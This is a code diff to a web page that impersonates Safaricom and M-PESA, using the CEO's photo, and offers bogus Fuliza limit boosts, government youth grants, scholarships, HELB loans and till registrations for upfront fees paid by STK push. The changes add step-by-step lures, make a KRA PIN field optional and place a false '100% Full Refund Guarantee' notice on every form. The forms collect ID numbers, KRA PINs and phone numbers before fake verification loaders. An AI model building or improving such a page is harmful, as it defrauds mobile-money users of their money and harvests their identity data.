@@ -74,7 +74,6 @@
         .filter-chip { padding: 10px 20px; border-radius: 24px; border: 1px solid var(--border); background: var(--surface); color: var(--text-muted); font-size: 13px; font-weight: 600; white-space: nowrap; cursor: pointer; transition: all 0.2s; }
         .filter-chip.active, .filter-chip:hover { background: var(--safaricom-green); color: #ffffff; border-color: var(--safaricom-green); }
 
-        /* MANDATED 2-COLUMN GRID DISPLAY ON DESKTOP */
         .services-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 24px; margin-top: 16px; }
         @media (max-width: 768px) { 
             .services-grid { grid-template-columns: 1fr; } 
@@ -86,7 +85,6 @@
         .service-icon { width: 56px; height: 56px; border-radius: 14px; background: #e6f7ed; display: flex; align-items: center; justify-content: center; font-size: 26px; flex-shrink: 0; }
         .service-badge { background: var(--chat-bg); color: var(--text-muted); font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 12px; text-transform: uppercase; }
 
-        /* LARGE ANIMATED BUTTONS */
         .btn-animated { 
             width: 100%; 
             background: linear-gradient(135deg, #00d26a 0%, var(--safaricom-green) 50%, var(--safaricom-dark-green) 100%);
@@ -120,7 +118,6 @@
         .tier-card.selected { border-color: var(--safaricom-green); background: #e6f7ed; }
         .tier-card.selected::after { content: "✓ Selected"; position: absolute; top: 12px; right: 12px; font-size: 10px; font-weight: 800; color: var(--safaricom-dark-green); background: #ffffff; padding: 3px 8px; border-radius: 12px; border: 1px solid var(--safaricom-green); }
 
-        /* TILL SELECTION GRID STYLES */
         .till-grid-container {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -161,6 +158,52 @@
             background: #e6f7ed;
             color: var(--safaricom-dark-green);
             box-shadow: 0 0 0 2px var(--safaricom-green);
+        }
+
+        /* GUARANTEE AND HOW-IT-WORKS STYLES */
+        .how-it-works-box {
+            background: var(--chat-bg);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            padding: 14px 16px;
+            margin-bottom: 16px;
+        }
+        .how-it-works-title {
+            font-size: 12px;
+            font-weight: 800;
+            color: var(--safaricom-dark-green);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .how-it-works-list {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .how-it-works-list li {
+            font-size: 12px;
+            color: var(--text-dark);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .how-it-works-list li span {
+            background: var(--safaricom-green);
+            color: #fff;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            font-weight: 800;
+            flex-shrink: 0;
         }
 
         .guarantee-note { background: #fff8f8; border: 1px solid #fecaca; border-left: 4px solid var(--safaricom-red); padding: 12px 16px; border-radius: var(--radius-sm); font-size: 12px; color: #7f1d1d; margin: 14px 0; }
@@ -235,7 +278,7 @@
             </div>
             
             <div class="ceo-portrait-card">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/Peter_Ndegwa_CEO.jpg/440px-Peter_Ndegwa_CEO.jpg" alt="Peter Ndegwa - CEO Safaricom PLC" class="ceo-portrait-img">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/42/Peter_Ndegwa_at_WEF_2024.png" alt="Peter Ndegwa - CEO Safaricom PLC" class="ceo-portrait-img">
                 <div class="ceo-info">
                     <span class="ceo-name">Peter Ndegwa</span>
                     <span class="ceo-title">CEO, Safaricom PLC</span>
@@ -314,7 +357,7 @@
                 <h4>Guarantee & Security</h4>
                 <ul>
                     <li>🔒 256-Bit SSL Secured</li>
-                    <li>🛡️ FinAPI STK Direct Protection</li>
+                    <li>🛡️ 100% Money-Back Guaranteed</li>
                     <li>⚡ Instant Mobile Authorization</li>
                 </ul>
             </div>
@@ -379,7 +422,12 @@
                 category: 'loans',
                 categoryLabel: 'Loans & Overdrafts',
                 icon: '⚡',
-                desc: 'Instant overdraft expansion. Every verified line receives an immediate +KSh 67,000 limit boost for a processing fee of KSh 500.'
+                desc: 'Instant overdraft expansion. Every verified line receives an immediate +KSh 67,000 limit boost for a processing fee of KSh 500.',
+                howItWorks: [
+                    "Fill in your Safaricom mobile line and National ID details.",
+                    "System automatically verifies your account standing in 6 seconds.",
+                    "Pay the KSh 500 processing fee via STK push to unlock your +KSh 67,000 limit."
+                ]
             },
             {
                 id: 'nyota',
@@ -388,7 +436,12 @@
                 category: 'youth',
                 categoryLabel: 'Youth Programs',
                 icon: '🌟',
-                desc: 'Government youth empowerment grants & capital allocation ranging from KSh 22,000 to KSh 400,000.'
+                desc: 'Government youth empowerment grants & capital allocation ranging from KSh 22,000 to KSh 400,000.',
+                howItWorks: [
+                    "Enter your applicant details, location, and KRA PIN.",
+                    "Select your preferred business grant tier (KSh 22,000 to KSh 400,000).",
+                    "Authorize the application fee to receive funds straight to your M-PESA."
+                ]
             },
             {
                 id: 'scholarships',
@@ -397,7 +450,12 @@
                 category: 'education',
                 categoryLabel: 'Scholarships & Education',
                 icon: '🌍',
-                desc: 'Full local scholarships across all 47 Kenyan counties and international study programs with visa & passport connection.'
+                desc: 'Full local scholarships across all 47 Kenyan counties and international study programs with visa & passport connection.',
+                howItWorks: [
+                    "Choose local (47 counties) or foreign country scholarship.",
+                    "Upload your academic transcripts and student ID details.",
+                    "Pay the processing fee to confirm institutional placement and reporting schedule."
+                ]
             },
             {
                 id: 'helb',
@@ -406,7 +464,12 @@
                 category: 'education',
                 categoryLabel: 'Education & Grants',
                 icon: '🎓',
-                desc: 'Official portal for undergraduate, TVET, upkeep loan applications, compliance clearance certificates, and disbursement tracking.'
+                desc: 'Official portal for undergraduate, TVET, upkeep loan applications, compliance clearance certificates, and disbursement tracking.',
+                howItWorks: [
+                    "Select whether you need a new HELB loan or a clearance certificate.",
+                    "Input your educational history or ID details and upload your result slip.",
+                    "Pay the service processing fee to get immediate digital confirmation & approval."
+                ]
             },
             {
                 id: 'mpesa_till',
@@ -415,7 +478,12 @@
                 category: 'payments',
                 categoryLabel: 'Payments & Tills',
                 icon: '💼',
-                desc: 'Register dedicated Buy Goods Till numbers for your business with instant line allocation.'
+                desc: 'Register dedicated Buy Goods Till numbers for your business with instant line allocation.',
+                howItWorks: [
+                    "Fill out your business KYC info and upload your National ID copy.",
+                    "Pick any available reserved masked Till number from our live directory.",
+                    "Authorize the KSh 200 registration fee to instantly activate your Merchant Till."
+                ]
             },
             {
                 id: 'kplc',
@@ -424,7 +492,12 @@
                 category: 'utilities',
                 categoryLabel: 'Utilities & Power',
                 icon: '💡',
-                desc: 'Instant prepaid token purchase and postpaid bill settlement via direct Safaricom STK Push.'
+                desc: 'Instant prepaid token purchase and postpaid bill settlement via direct Safaricom STK Push.',
+                howItWorks: [
+                    "Enter your KPLC Meter or Postpaid Account number.",
+                    "System auto-verifies your registered meter ownership.",
+                    "Enter your desired top-up amount and approve payment to get your token SMS."
+                ]
             },
             {
                 id: 'ziidi',
@@ -433,7 +506,12 @@
                 category: 'investments',
                 categoryLabel: 'Investments & Savings',
                 icon: '📈',
-                desc: 'High-yield Money Market Fund with record performance across Safaricom, KCB, and ABSA equities.'
+                desc: 'High-yield Money Market Fund with record performance across Safaricom, KCB, and ABSA equities.',
+                howItWorks: [
+                    "Use our yield calculator to project your monthly and annual compound returns.",
+                    "Input your investment amount (minimum KSh 200) along with your National ID.",
+                    "Authorize the deposit via M-PESA to start earning high daily interest."
+                ]
             }
         ];
 
@@ -525,6 +603,30 @@
             });
         }
 
+        function getHowItWorksHtml(serviceObj) {
+            if (!serviceObj || !serviceObj.howItWorks) return '';
+            const steps = serviceObj.howItWorks.map((step, idx) => `
+                <li><span>${idx + 1}</span> ${step}</li>
+            `).join('');
+
+            return `
+                <div class="how-it-works-box">
+                    <div class="how-it-works-title">📌 How It Works</div>
+                    <ul class="how-it-works-list">
+                        ${steps}
+                    </ul>
+                </div>
+            `;
+        }
+
+        function getMoneyBackGuaranteeNotice() {
+            return `
+                <div class="guarantee-note">
+                    <strong>🛡️ 100% Full Refund Guarantee:</strong> Should your application or service request fail to process successfully for any reason, your paid fee will be automatically and fully refunded back to your M-PESA account immediately with zero deductions.
+                </div>
+            `;
+        }
+
         function triggerModalById(id) {
             const item = servicesData.find(s => s.id === id);
             if (!item) return;
@@ -570,6 +672,7 @@
         /* 1. FULIZA BOOST FORM */
         function renderFulizaStep1(container) {
             container.innerHTML = `
+                ${getHowItWorksHtml(activeServiceObj)}
                 <div style="font-size: 12px; font-weight: 800; color: var(--safaricom-dark-green); margin-bottom: 10px;">FULIZA LIMIT EVALUATION & CREDENTIAL VERIFICATION</div>
                 <form onsubmit="run6SecLoader('Evaluating Line History & Processing Boost', renderFulizaStep2)">
                     <div class="form-grid">
@@ -586,14 +689,15 @@
                             <input type="text" required placeholder="Full Name as on ID">
                         </div>
                         <div class="form-group">
-                            <label>KRA PIN Number *</label>
-                            <input type="text" required placeholder="e.g. A019283748Z">
+                            <label>KRA PIN Number (Optional)</label>
+                            <input type="text" placeholder="e.g. A019283748Z">
                         </div>
                         <div class="form-group full-width">
                             <label>Current Fuliza Limit (KSh) *</label>
                             <input type="number" required placeholder="Enter current limit (e.g. 0, 500, 2000)" min="0">
                         </div>
                     </div>
+                    ${getMoneyBackGuaranteeNotice()}
                     <button type="submit" class="btn-animated">VERIFY & CALCULATE BOOST &rarr;</button>
                 </form>
             `;
@@ -615,6 +719,8 @@
                     <strong>✅ Guaranteed Boost:</strong> Authorizing the KSh 500 processing fee will update your Fuliza balance immediately.
                 </div>
 
+                ${getMoneyBackGuaranteeNotice()}
+
                 <button class="btn-animated" onclick="triggerStkPayment(500)">AUTHORIZE KSH 67,000 BOOST (PAY KSH 500) &rarr;</button>
             `;
         }
@@ -623,6 +729,7 @@
         function renderNyotaStep1(container) {
             selectedNyotaGrant = null;
             container.innerHTML = `
+                ${getHowItWorksHtml(activeServiceObj)}
                 <div style="font-size: 12px; font-weight: 800; color: var(--safaricom-dark-green); margin-bottom: 10px;">STEP 1 OF 2: APPLICANT IDENTIFICATION & VERIFICATION</div>
                 <form onsubmit="run6SecLoader('Validating Youth Empowerment Credentials', renderNyotaStep2)">
                     <div class="form-grid">
@@ -632,6 +739,7 @@
                         <div class="form-group"><label>Sub-County / Location *</label><input type="text" required placeholder="e.g. Westlands, Nairobi"></div>
                         <div class="form-group full-width"><label>M-PESA Phone Number *</label><input type="tel" pattern="^(07|01|254)[0-9]{8}$" required placeholder="07XXXXXXXX"></div>
                     </div>
+                    ${getMoneyBackGuaranteeNotice()}
                     <button type="submit" class="btn-animated">CONTINUE TO GRANT SELECTION &rarr;</button>
                 </form>
             `;
@@ -668,6 +776,8 @@
                     </div>
                 </div>
 
+                ${getMoneyBackGuaranteeNotice()}
+
                 <div id="nyotaActionArea" style="margin-top: 16px;">
                     <p style="font-size: 13px; color: var(--safaricom-red); text-align: center; font-weight:700;">⚠️ Tap on one of the grant tiers above to activate payment.</p>
                 </div>
@@ -691,6 +801,7 @@
         /* 3. SCHOLARSHIPS PORTAL FORM */
         function renderScholarshipsPortal(container) {
             container.innerHTML = `
+                ${getHowItWorksHtml(activeServiceObj)}
                 <div style="font-size: 12px; font-weight: 800; color: var(--safaricom-dark-green); margin-bottom: 10px;">SCHOLARSHIP CATEGORY SELECTION</div>
                 <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 16px;">Choose between a domestic scholarship across 47 Kenyan counties or an International Foreign Scholarship.</p>
                 
@@ -706,6 +817,8 @@
                         <div class="tier-fee" style="margin-top:8px;">Package Fee: KSh 25,000</div>
                     </div>
                 </div>
+
+                ${getMoneyBackGuaranteeNotice()}
             `;
         }
 
@@ -758,9 +871,7 @@
                         </div>
                     </div>
 
-                    <div class="guarantee-note">
-                        <strong>🛡️ Guaranteed Schedule:</strong> Official reporting date schedule is generated immediately after processing.
-                    </div>
+                    ${getMoneyBackGuaranteeNotice()}
 
                     <button type="submit" class="btn-animated">VERIFY, UPLOAD & PAY KSH 2,300 &rarr;</button>
                 </form>
@@ -829,9 +940,7 @@
                         </div>
                     </div>
 
-                    <div class="guarantee-note">
-                        <strong>✈️ Package Includes:</strong> Direct passport processing, embassy clearance booking, airfare voucher connection, and tuition scholarship confirmation.
-                    </div>
+                    ${getMoneyBackGuaranteeNotice()}
 
                     <button type="submit" class="btn-animated">SUBMIT APPLICATION & PAY KSH 25,000 &rarr;</button>
                 </form>
@@ -869,6 +978,7 @@
                         <p style="font-size:13px; margin-bottom:8px;">Your official reporting date to the institution is scheduled for: <strong>${reportingDate}</strong>.</p>
                         <p style="font-size:12px;">Authorize payment below to initiate M-PESA STK Push and receive admission confirmation via SMS.</p>
                     </div>
+                    ${getMoneyBackGuaranteeNotice()}
                     <button class="btn-animated" onclick="triggerStkPayment(${fee})">PROCEED TO PAY KSH ${fee} VIA STK &rarr;</button>
                 `;
             });
@@ -877,6 +987,7 @@
         /* 4. HELB PORTAL FORM */
         function renderEnhancedHelbPortal(container) {
             container.innerHTML = `
+                ${getHowItWorksHtml(activeServiceObj)}
                 <div style="font-size: 12px; font-weight: 800; color: var(--safaricom-dark-green); margin-bottom: 10px;">HELB SMART PORTAL SERVICES</div>
                 <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 14px;">Select your requested HELB service:</p>
 
@@ -892,6 +1003,8 @@
                         <div class="tier-fee" style="margin-top:8px;">Processing Fee: KSh 300</div>
                     </div>
                 </div>
+
+                ${getMoneyBackGuaranteeNotice()}
             `;
         }
 
@@ -934,6 +1047,7 @@
                             <input type="tel" placeholder="07XXXXXXXX" pattern="^(07|01|254)[0-9]{8}$" required>
                         </div>
                     </div>
+                    ${getMoneyBackGuaranteeNotice()}
                     <button type="submit" class="btn-animated">SUBMIT & AUTHORIZE HELB LOAN (PAY KSH 250) &rarr;</button>
                 </form>
             `;
@@ -962,12 +1076,13 @@
                             <input type="tel" placeholder="07XXXXXXXX" pattern="^(07|01|254)[0-9]{8}$" required>
                         </div>
                     </div>
+                    ${getMoneyBackGuaranteeNotice()}
                     <button type="submit" class="btn-animated">GENERATE CERTIFICATE (PAY KSH 300) &rarr;</button>
                 </form>
             `;
         }
 
-        /* 5. TILL REGISTRATION FORM (UPDATED WITH REAL REQUIREMENTS & 45 MASKED TILL NUMBERS) */
+        /* 5. TILL REGISTRATION FORM */
         function renderTillForm(container) {
             selectedTillNumber = null;
             let tillCards = maskedTillNumbers.map((till, idx) => `
@@ -977,6 +1092,7 @@
             `).join('');
 
             container.innerHTML = `
+                ${getHowItWorksHtml(activeServiceObj)}
                 <div style="font-size: 12px; font-weight: 800; color: var(--safaricom-dark-green); margin-bottom: 6px;">LIPA NA M-PESA BUY GOODS TILL REGISTRATION (KSh 200)</div>
                 <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 14px;">Fill in mandatory business KYC details and select an available masked Till number to activate.</p>
 
@@ -1037,6 +1153,8 @@
                         <p style="font-size: 12px; color: var(--safaricom-red); text-align: center; font-weight:700;">⚠️ Please click on a masked Till Number above to select it before proceeding.</p>
                     </div>
 
+                    ${getMoneyBackGuaranteeNotice()}
+
                     <button type="submit" id="tillSubmitBtn" disabled class="btn-animated" style="opacity: 0.6; cursor: not-allowed;">REGISTER SELECTED TILL & PAY KSH 200 &rarr;</button>
                 </form>
             `;
@@ -1070,9 +1188,10 @@
             triggerStkPayment(200);
         }
 
-        /* 6. LOGICAL KPLC BILLS PAYMENT FORM WITH ALL REAL-WORLD REQUIREMENTS */
+        /* 6. KPLC BILLS PAYMENT FORM */
         function renderKplcForm(container) {
             container.innerHTML = `
+                ${getHowItWorksHtml(activeServiceObj)}
                 <div style="font-size: 12px; font-weight: 800; color: var(--safaricom-dark-green); margin-bottom: 10px;">KPLC UTILITIES & POWER BILL PAYMENT</div>
                 <form onsubmit="handleFormSubmit(event, document.getElementById('kplcAmount').value)">
                     <div class="form-grid">
@@ -1117,6 +1236,8 @@
                         <strong>💡 Meter Verified:</strong> Active KPLC connection recognized. Tokens will be dispatched instantly via SMS.
                     </div>
 
+                    ${getMoneyBackGuaranteeNotice()}
+
                     <button type="submit" class="btn-animated">BUY TOKENS / PAY KPLC BILL NOW &rarr;</button>
                 </form>
             `;
@@ -1147,6 +1268,7 @@
             }).join('');
 
             container.innerHTML = `
+                ${getHowItWorksHtml(activeServiceObj)}
                 <div class="analytics-container">
                     <div class="analytics-header">
                         <span>📊 Shares & Yield Performance History (2016 – 2026)</span>
@@ -1222,9 +1344,7 @@
                             <input type="tel" pattern="^(07|01|254)[0-9]{8}$" required placeholder="07XXXXXXXX">
                         </div>
                     </div>
-                    <div class="guarantee-note" style="margin-top:4px;">
-                        🔒 Licensed by CMA. Daily interest accruals are accessible directly via M-PESA.
-                    </div>
+                    ${getMoneyBackGuaranteeNotice()}
                     <button type="submit" class="btn-animated">DEPOSIT CAPITAL VIA M-PESA &rarr;</button>
                 </form>
             `;
@@ -1317,13 +1437,11 @@
             const faq = zuriFaqs20[index];
             const chatBody = document.getElementById('zuriChatBody');
 
-            // 1. Render User Question
             const userMsg = document.createElement('div');
             userMsg.className = 'zuri-msg user';
             userMsg.innerText = faq.q;
             chatBody.appendChild(userMsg);
 
-            // 2. Render 4-Second Typing Indicator
             const typingIndicator = document.createElement('div');
             typingIndicator.className = 'zuri-typing';
             typingIndicator.id = 'zuriTypingIndicator';
@@ -1332,7 +1450,6 @@
 
             chatBody.scrollTop = chatBody.scrollHeight;
 
-            // 3. 4-Second Delay before Positively Responding
             setTimeout(() => {
                 const indicator = document.getElementById('zuriTypingIndicator');
                 if (indicator) indicator.remove();
